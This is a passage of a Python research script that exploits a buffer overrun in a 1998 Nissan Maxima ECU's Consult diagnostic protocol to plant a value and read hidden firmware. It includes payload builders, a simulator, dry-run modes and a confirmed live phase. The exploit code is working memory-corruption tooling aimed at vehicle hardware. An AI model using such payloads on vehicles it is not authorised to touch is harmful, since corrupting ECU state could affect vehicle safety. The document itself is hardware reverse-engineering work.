452	        print(f"    [{i:2d}] len={len(f):2d}  {hex_str}")
453	
454	    return frames
455	
456	
457	def run_direct_baseline(c, n_frames=4):
458	    """Baseline: run 0A direct mode alone to see its frame format."""
459	    print(f"\n--- Baseline: 0A direct mode alone ---")
460	    print(f"  Sending 0A 02 81 + F0...")
461	
462	    cmd = bytes([0x0A, 0x02, 0x81])
463	    c.command(cmd)
464	    c.t.note("baseline 0A direct")
465	
466	    frames = []
467	    try:
468	        for _ in range(n_frames):
469	            f = c.read_frame(timeout=1.0)
470	            frames.append(f)
471	    except TimeoutError:
472	        pass
473	
474	    c.stop(timeout=0.5)
475	    c.t.drain(quiet=0.05)
476	
477	    print(f"  Streamed {len(frames)} frames.")
478	    for i, f in enumerate(frames):
479	        hex_str = " ".join(f"{b:02X}" for b in f)
480	        print(f"    [{i:2d}] len={len(f):2d}  {hex_str}")
481	
482	    return frames
483	
484	
485	# ---------------------------------------------------------------------------
486	# Dry run
487	# ---------------------------------------------------------------------------
488	
489	def dry_run_plant(target_addr, h8_dump):
490	    """Simulate the plant and show what would happen."""
491	    target_hi = (target_addr >> 8) & 0xFF
492	    target_lo = target_addr & 0xFF
493	
494	    result = build_plant_payload(target_hi, target_lo, h8_dump)
495	    if result is None:
496	        print(f"  No payload found for ${target_addr:04X} with this H8 dump.")
497	        return False
498	
499	    payload, stop_frame = result
500	
501	    print(f"  Target:     ${target_addr:04X} (hi=${target_hi:02X} lo=${target_lo:02X})")
502	    print(f"  Main addr:  ${payload[0]:04X}")
503	    print(f"  Payload:    15×${payload[0]:04X} + ${payload[15]:04X} ${payload[16]:04X} "
504	          f"${payload[17]:04X} ${payload[18]:04X} ${payload[19]:04X}")
505	    print(f"  Stop after: frame {stop_frame}")
506	
507	    ram = simulate_overrun(payload)
508	    writes = simulate_builder(dict(ram), h8_dump, stop_frame + 4)
509	
510	    print(f"\n  Reply builder writes:")
511	    for frame, target, value in writes:
512	        lbl = ""
513	        if target == CS_STREAMLIST:
514	            lbl = " ← streamlist[0] lo"
515	        elif target == CS_STREAMLIST + 1:
516	            lbl = " ← streamlist[0] hi"
517	        print(f"    frame {frame:2d}: → ${target:04X} = ${value:02X}{lbl}")
518	
519	    return True
520	
521	
522	def dry_run_sweep(h8_dump):
523	    """Show all achievable hidden-region addresses."""
524	    results = sweep_plant_targets(h8_dump)
525	    if not results:
526	        print("  No hidden-region addresses achievable with this H8 dump.")
527	        return
528	
529	    print(f"  Achievable hidden-region addresses: {len(results)}")
530	    print()
531	    pages = {}
532	    for addr in sorted(results):
533	        page = addr >> 8
534	        pages.setdefault(page, []).append(addr)
535	        main, a17, a18, a19, hi, lo, hf, lf, sf = results[addr]
536	        print(f"    ${addr:04X}  main=${main:04X}  "
537	              f"hi=${hi:02X}@f{hf} lo=${lo:02X}@f{lf}  stop@f{sf}")
538	
539	    print(f"\n  Coverage: {len(results)} / {FORWARD_HI - FORWARD_LO + 1} "
540	          f"({100 * len(results) / (FORWARD_HI - FORWARD_LO + 1):.1f}%)")
541	    for page in sorted(pages):
542	        print(f"    ${page:02X}xx: {len(pages[page])} addrs")
543	
544	
545	def dry_run_mixed():
546	    """Show the mixed command layout."""
547	    print(f"\n--- Mixed command (0A + C9 overrun) ---")
548	    oa_bytes, c9_addrs = build_mixed_payload()
549	    print(f"  0A args:    {oa_bytes.hex(' ')}")
550	    print(f"  C9 addrs:   {len(c9_addrs)} (14×${c9_addrs[0]:04X} + "
551	          + " ".join(f"${a:04X}" for a in c9_addrs[14:]) + ")")
552	    print(f"  Total args: 2 + {len(c9_addrs)*2} = {2 + len(c9_addrs)*2} bytes (limit 40)")
553	
554	    # Simulate the overrun as the ECU would see it (0A args at argbuf[0..1])
555	    # The 0A arg bytes go into cs_argbuf as received: [fb=02, val=81].
556	    # The M37732 reads 16-bit words little-endian, so pair 0 = $8102.
557	    # But the simulation's ww/rw is self-consistent, so we pass the
558	    # protocol-order value $0281 and it stays consistent.
559	    all_pairs = [0x0281] + c9_addrs
560	    ram = simulate_overrun_mixed(all_pairs)
561	    flags = ram.get(FWD_FLAGS, 0)
562	    print(f"  $07E3 = ${flags:02X}  bit0={'SET' if flags & 1 else 'CLR'}  "
563	          f"bit1={'SET' if flags & 2 else 'CLR'}")
564	
565	    n_final = ram.get(HIDDEN_N, 0)
566	    cursor = ram.get(REPLY_CURSOR, 0)
567	    print(f"  n=${n_final:02X}  cursor=${cursor:02X}")
568	
569	    idx_0e = ram.get(HIDDEN_IDX + 0x0E, 0)
570	    idx_10 = ram.get(HIDDEN_IDX + 0x10, 0)
571	    sub = ram.get(C9_SUB_VAL, 0)
572	    print(f"  idx[$0E]=${idx_0e:02X} → cs_payload[${idx_0e:02X}] = ${CS_PAYLOAD + idx_0e:04X}")
573	    print(f"  idx[$10]=${idx_10:02X} → cs_payload[${idx_10:02X}] = ${CS_PAYLOAD + idx_10:04X}")
574	    print(f"  c9_sub_value=${sub:02X} (stale byte for frame 0)")
575	    print()
576	    print(f"  Expected: frame 0 writes ${sub:02X} to ${CS_PAYLOAD + idx_0e:04X}")
577	    print(f"            frame 2 writes H8 reply to ${CS_PAYLOAD + idx_10:04X}")
578	    if idx_0e == 0x61 and idx_10 == 0x60:
579	        print(f"            → streamlist[0] = ${sub:02X}XX (page ${sub:02X}, lo from H8)")
580	    elif idx_0e == 0x60 and idx_10 == 0x61:
581	        print(f"            → streamlist[0] = XX{sub:02X} (hi from H8, lo ${sub:02X})")
582	
583	
584	def simulate_overrun_mixed(all_pairs):
585	    """Simulate c9_find_hidden with cs_argbuf containing 0A args + C9 addrs."""
586	    ram = {}
587	    def rb(a): return ram.get(a, 0)
588	    def wb(a, v): ram[a] = v & 0xFF
589	    def rw(a): return rb(a) | (rb(a + 1) << 8)
590	    def ww(a, v): wb(a, v & 0xFF); wb(a + 1, (v >> 8) & 0xFF)
591	
592	    cs_argc = len(all_pairs) * 2
593	    for i, a in enumerate(all_pairs):
594	        ww(0x08D2 + 2 * i, a)
595	    wb(HIDDEN_N, 0)
596	    wb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)
597	
598	    for i in range(20):
599	        if 2 * i >= cs_argc:
600	            break
601	        a_val = rw(0x08D2 + 2 * i)
602	        if not (FORWARD_LO <= a_val < 0x6240):
603	            if 2 * (i + 1) >= cs_argc:
604	                break
605	            continue
606	        wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)
607	        n = rb(HIDDEN_N)
608	        addr_idx = (2 * n) & 0xFF
609	        ww(HIDDEN_ADDR + addr_idx, a_val - 0x5000)
610	        n_re = rw(HIDDEN_N) & 0xFF
611	        wb(HIDDEN_IDX + n_re, i & 0xFF)
612	        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)
613	        if 2 * (i + 1) >= cs_argc:
614	            break
615	    return ram
616	
617	
618	# ---------------------------------------------------------------------------
619	# Main
620	# ---------------------------------------------------------------------------
621	
622	def main():
623	    ap = argparse.ArgumentParser(
624	        description=__doc__,
625	        formatter_class=argparse.RawDescriptionHelpFormatter)
626	    ap.add_argument("--dev", default=DEFAULT_DEV,
627	                    help=f"serial device (default: {DEFAULT_DEV})")
628	    ap.add_argument("--addr", type=lambda x: int(x, 16), default=None,
629	                    help="target hidden-region address in hex (default: auto from sweep)")
630	    ap.add_argument("--h8", default=os.path.join(ROOT, "h8_clean.bin"),
631	                    help="H8 dump for simulation (default: h8_clean.bin)")
632	    ap.add_argument("--sweep", action="store_true",
633	                    help="show all achievable target addresses")
634	    ap.add_argument("--mixed-only", action="store_true",
635	                    help="skip the plant+verify phases, run mixed command only")
636	    ap.add_argument("--frames", type=int, default=12,
637	                    help="frames to stream in mixed phase (default: 12)")
638	    ap.add_argument("--dry-run", action="store_true",
639	                    help="simulate only, don't talk to the ECU")
640	    args = ap.parse_args()
641	
642	    print("c9_hidden_read: read main CPU hidden code via overrun + streamlist chain")
643	    print("Target ECU: 23710-2L904 (1998 Maxima VQ30DE)")
644	    print()
645	
646	    h8_dump = None
647	    if os.path.exists(args.h8):
648	        h8_dump = load_h8(args.h8)
649	        print(f"H8 dump: {args.h8} ({len(h8_dump)} bytes)")
650	    else:
651	        print(f"H8 dump not found: {args.h8}")
652	        print("  (needed for plant simulation — mixed command still works without it)")
653	
654	    # --- Sweep ---
655	    if args.sweep:
656	        if h8_dump is None:
657	            sys.exit("--sweep requires an H8 dump (--h8)")
658	        print()
659	        dry_run_sweep(h8_dump)
660	        print()
661	        dry_run_mixed()
662	        return
663	
664	    # --- Pick target ---
665	    target_addr = args.addr
666	    sweep_results = None
667	    if target_addr is not None:
668	        if not (FORWARD_LO <= target_addr <= FORWARD_HI):
669	            sys.exit(f"target ${target_addr:04X} outside hidden region "
670	                     f"${FORWARD_LO:04X}–${FORWARD_HI:04X}")
671	    elif h8_dump is not None:
672	        sweep_results = sweep_plant_targets(h8_dump)
673	        if sweep_results:
674	            # Pick a target the plant builder can actually produce a payload for
675	            for candidate in sorted(sweep_results.keys()):
676	                hi = (candidate >> 8) & 0xFF
677	                lo = candidate & 0xFF
678	                if build_plant_payload(hi, lo, h8_dump) is not None:
679	                    target_addr = candidate
680	                    break
681	            if target_addr is not None:
682	                print(f"Auto-selected target: ${target_addr:04X} "
683	                      f"({len(sweep_results)} achievable by sweep)")
684	            else:
685	                print(f"Sweep found {len(sweep_results)} targets but plant "
686	                      f"builder can't produce payloads for them; using mixed only.")
687	        else:
688	            print("No plant targets found; will run mixed command only.")
689	    else:
690	        print("No H8 dump and no --addr; will run mixed command only.")
691	
692	    # --- Dry run ---
693	    if args.dry_run:
694	        if target_addr is not None and h8_dump is not None:
695	            print(f"\n--- Plant simulation for ${target_addr:04X} ---")
696	            dry_run_plant(target_addr, h8_dump)
697	        dry_run_mixed()
698	        return
699	
700	    # --- Live ---
701	    print()
702	    print("-" * 60)
703	    print("SAFETY: writes to Consult handler state only ($0740-$08D6).")
704	    print("No code redirect possible. Key cycle clears all corruption.")
705	    print("Run with key on, ENGINE OFF.")
706	    print("-" * 60)
707	    ok = input("Proceed? [y/N] ")
708	    if ok.strip().lower() != "y":
709	        sys.exit("not sent")
710	    print()
711	
712	    os.makedirs(LOG_DIR, exist_ok=True)
713	    log = os.path.join(LOG_DIR, f"{datetime.date.today()}_hidden-read.log")
714	    t = Transport(args.dev, log)
715	    t.note("c9_hidden_read start")
716	
717	    try:
718	        c = Consult(t)
719	        c.ecu_ids = ENGINE_IDS
720	
721	        r = c.init()
722	        if r is None:
723	            sys.exit("init failed (ignition on?)")
724	        attempt, secs, junk, ecu = r
725	        print(f"\ninit ok: id {ecu:02X}, attempt {attempt}, {secs * 1000:.0f} ms")
726	
727	        # Baseline streamlist
728	        sl_before = read_c9(c, [CS_STREAMLIST, CS_STREAMLIST + 1,
729	                                 CS_STREAMLIST + 2, CS_STREAMLIST + 3])
730	        print(f"  streamlist before: {sl_before.hex(' ')}")
731	
732	        if not args.mixed_only and target_addr is not None and h8_dump is not None:
733	            # Phase 1: Plant
734	            target_hi = (target_addr >> 8) & 0xFF
735	            target_lo = target_addr & 0xFF
736	            result = build_plant_payload(target_hi, target_lo, h8_dump)
737	            if result is None:
738	                print(f"\nNo payload for ${target_addr:04X} — skipping plant, going to mixed.")
739	            else:
740	                payload, stop_frame = result
741	                run_plant(c, payload, stop_frame, target_addr)
742	
743	                # Phase 2: Verify
744	                word0, word1 = run_verify(c, target_addr)
745	
746	        # Phase 3: Baseline 0A
747	        print()
748	        c.init()
749	        baseline = run_direct_baseline(c, 4)
750	
751	        # Phase 4: Mixed command
752	        print()
753	        c.init()
754	        mixed = run_mixed(c, args.frames)
755	
756	        # Analysis
757	        print(f"\n{'=' * 60}")
758	        print("ANALYSIS")
759	        print(f"{'=' * 60}")
760	
761	        if baseline and mixed:
762	            bl = baseline[0] if baseline else b""
763	            mx = mixed[-1] if mixed else b""
764	            print(f"\n  Baseline 0A frame length: {len(bl)}")

771	                for i, f in enumerate(mixed):
772	                    if len(f) >= len(bl):
773	                        direct = f[:len(bl)]
774	                        print(f"    frame {i:2d}: direct={direct.hex(' ')}")
775	                print(f"\n  If direct-mode bytes are at the END:")
776	                for i, f in enumerate(mixed):
777	                    if len(f) >= len(bl):
778	                        direct = f[-len(bl):]

780	            else:
781	                print(f"  Same length — direct and C9 might share slots or"
782	                      f" only one builder ran.")
783	                print(f"  Compare frame values:")
784	                for i, f in enumerate(mixed):
785	                    bl_f = baseline[min(i, len(baseline) - 1)] if baseline else b""
786	                    diff = sum(1 for a, b in zip(f, bl_f) if a != b) if len(f) == len(bl_f) else -1
787	                    print(f"    frame {i:2d}: {f.hex(' ')}"
788	                          f"{'  (' + str(diff) + ' bytes differ)' if diff >= 0 else ''}")
789

791	        print(f"  Look for transition in direct-mode bytes after frame 2")
792	        print(f"  (that's when the overrun finishes planting $07A0).")
